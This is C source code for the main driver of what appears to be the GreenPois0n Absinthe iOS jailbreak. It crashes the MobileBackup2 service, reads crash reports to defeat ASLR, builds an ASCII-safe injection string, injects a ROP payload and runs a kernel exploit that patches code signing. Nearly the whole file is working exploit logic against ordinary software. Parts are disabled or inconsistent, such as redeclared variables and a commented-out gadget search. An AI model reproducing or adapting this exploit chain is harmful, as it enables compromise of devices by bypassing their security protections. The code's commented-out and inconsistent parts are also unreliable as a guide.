/**
 * GreenPois0n Absinthe - absinthe.c
 * Copyright (C) 2010 Chronic-Dev Team
 * Copyright (C) 2010 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "mb2.h"
#include "debug.h"
#include "device.h"
#include "dictionary.h"
#include "crashreporter.h"

#include "offsets.h"

#ifdef WIN32
#define sleep(x) Sleep(x*1000)
#endif

////////////////////////////////////////////////////////////////////////////////////////
// TODO: We need to add an event handler for when devices are connected. This handler //
//         needs to wait for iTunes to autostart and kill it before it can start the  //
//         syncing process and mess up our connection.                                //
////////////////////////////////////////////////////////////////////////////////////////

typedef enum {
	kFalse = 0, kTrue = 1
} bool;

int check_ascii_string(const char* string, size_t length) {
	size_t i = 0;
	if (string) {
		// Loop through each byte in this string and make sure it contains no invalid
		//  ASCII characters that might screw up our exploit
		for (i = 0; i < length; i++) {
			char letter = string[i];
			if ((letter & 0x80) > 0 || (letter & 0x7F) == 0) {
				// We have an invalid ASCII character here folks!
				return kFalse;
			}
		}
	}

	return kTrue;
}

int check_ascii_pointer(uint32_t pointer) {
	if((pointer & 0x80808080) > 0) {
		//debug("FAIL\n");
		return 0;
	}
	//debug("Passed ASCII test\n");
	if((pointer & 0x7F000000) == 0 ||
		(pointer & 0x007F0000) == 0 ||
		(pointer & 0x00007F00) == 0 ||
		(pointer & 0x0000007F) == 0) {
		//debug("FAIL\n");
		//debug("0x%08x & 0x7F7F7F7F = 0x%08x\n", pointer, (pointer & 0x7F7F7F7F));
		return 0;
	}
	//debug("PASS\n");
	return 1;
}

int main(int argc, char* argv[]) {
	int err = 0;
	int k = atoi(argv[1]);
	// Pass a UUID here if you want to target a single device,
	//  or NULL to select the first one it finds.
	printf("Openning device connection\n");
	device_t* device = device_create(NULL);
	if (device == NULL) {
		error("Unable to find a device to use\n");
		return -1;
	}
	//device_enable_debug();
	srandom(k);
/*
	// First we need to discover all the dylib base addresses so we can find our
	//  ROP gadgets for our payloads. We do this by crashing BackupAgent2 once,
	//  then downloading the crashreport from the crashreport service.
	info("Opening connection to MobileBackup2 service\n");
	mb2_t* mb2 = mb2_connect(device);
	if (mb2 == NULL) {
		error("Unable to open connection to MobileBackup2 service\n");
		device_free(device);
		return -1;
	}

	// The second argument here is a pointer to the crashreport_t object containing
	//  our dylib base address, as well as the state the device was in last time
	//  it crashed.
	info("Crashing MobileBackup2 exploit so we can fetch a clean crashreport\n");
	err = mb2_crash(mb2);
	if (err < 0) {
		debug("Unable to crash MobileBackup2 service\n", err);
		device_free(device);
		return -1;
	}
	mb2_free(mb2);
	mb2 = NULL;


	//while(++k) {
	info("Giving the device a moment to write the crash report...\n");
	sleep(3);

	// Here we open crashreporter so we can download the mobilebackup2 crashreport
	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
	info("Opening connection to CrashReporter service\n");
	crashreporter_t* reporter = crashreporter_connect(device);
	if (reporter == NULL) {
		error("Unable to open connection to crash reporter\n");
		device_free(device);
		return -1;
	}

	// Read in the last crash since that's probably our fault anyways. Since dylib
	//  addresses are only randomized on boot, we now have base addresses to
	//  calculate the addresses of our ROP gadgets we need.
	info("Reading in crash reports from mobile backup\n");
	crashreport_t* crash = crashreporter_last_crash(reporter);
	if (crash == NULL) {
		error("Unable to read last crash\n");
		device_free(device);
		return -1;
	}
	crashreporter_free(reporter);

	char pc[0x20];
	memset(pc, '\0', 0x20);
	snprintf(pc, 0x1F, "0x%08x", crash->state->pc);
	debug("Found PC of %s\n", pc);
	mkdir(pc, 0700);
	char* command[0x200];
	snprintf(command, 0x1FF, "mv BackupAgent* %s", pc);
	debug("Executing command %s\n", command);
	system(command);
*/
	// Open and initialize a connection to MobileBackup2 service again to perform
	//  our injection exploit
	info("Opening connection to backup service\n");
	mb2_t* mb2 = mb2_connect(device);
	if (mb2 == NULL) {
		error("Unable to open connection to MobileBackup2 service\n");
		device_free(device);
		return -1;
	}

	// TODO: This code here needs to be stuck in a separate function, it looks ugly here
	int i = 0;
	int found = 0;
	uint32_t address = 0;
	// Loop through each ROP gadget for this firmware and find one in a nice ascii
	//  safe address for our stack pivot
	//for (i = 0; offsets[i].offset != 0; i++) {
		//address = crash->dylibs[2]->offset + offsets[i].offset;
		//check_ascii_string((const char*) address, 4);
	//}

	//if (found == 0) {
		//error("Unable to find ASCII safe gadget address for stack pivot\n");
		//return -1;
	//}info("Usable ASCII safe gadget address found at 0x%08x\n", address);

	int size = 0;
	char* attack = NULL;
		debug("Salt = %d\n", k);
		err = dictionary_make_attack(address, k, &attack, &size);
		if (err < 0) {
			error("Unable to make dictionary attack string for injection\n");
			return -1;
		}


	debug("Press any key to crash application...\n");
	//getchar();

	// Due to Apple's new ASLR, before we can overwrite stack with our ROP payload,
	//  we're going to need to figure out where our data is being stored. Heap
	//  and stack are randomized on each execution.
	info("Injecting ROP payload and leaking it's addresss\n");
	err = mb2_inject(mb2, attack, size);
	if (err < 0) {
		error("Unable to inject ROP payload or discover it's offset\n");
		device_free(device);
		return -1;
	}
	//mb2_free(mb2);
	//}
	// Now that we know where our data is, and we know where all the code is, we can
	//  pivot the stack onto our ROP payload and execute our kernel vulnerability.
	info("Executing kernel exploit and patching codesign\n");
	err = mb2_exploit(mb2);
	if (err < 0) {
		error("Unable to execute kernel exploit and patch codesign\n");
		device_free(device);
		return -1;
	}

	info("Giving the device a moment to write the crash report...\n");
	sleep(3);

	// Here we open crashreporter so we can download the mobilebackup2 crashreport
	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
	info("Opening connection to CrashReporter service\n");
	crashreporter_t* reporter = crashreporter_connect(device);
	if (reporter == NULL) {
		error("Unable to open connection to crash reporter\n");
		device_free(device);
		return -1;
	}

	// Read in the last crash since that's probably our fault anyways. Since dylib
	//  addresses are only randomized on boot, we now have base addresses to
	//  calculate the addresses of our ROP gadgets we need.
	info("Reading in crash reports from mobile backup\n");
	crashreport_t* crash = crashreporter_last_crash(reporter, k);
	if (crash == NULL) {
		error("Unable to read last crash\n");
		device_free(device);
		return -1;
	}
	crashreporter_free(reporter);
	//printf("200 %d\n\n", k);

	char pc[0x20];
	memset(pc, '\0', 0x20);
	snprintf(pc, 0x1F, "0x%08x", crash->state->lr);
	debug("Found PC of %s\n", pc);
	mkdir(pc, 0700);
	char* command[0x200];
	snprintf(command, 0x1FF, "mv BackupAgent* %s", pc);
	debug("Executing command %s\n", command);
	system(command);

	// All done, not sure if we should clean this up yet
	info("Closing MobileBackup2 service\n");
	if (mb2) mb2_free(mb2);

	// If open, then close and free structures
	info("Cleaning up\n");
	//if (crash) crashreport_free(crash);

	if (device) device_free(device);
	info("Done\n");
	return 0;
}
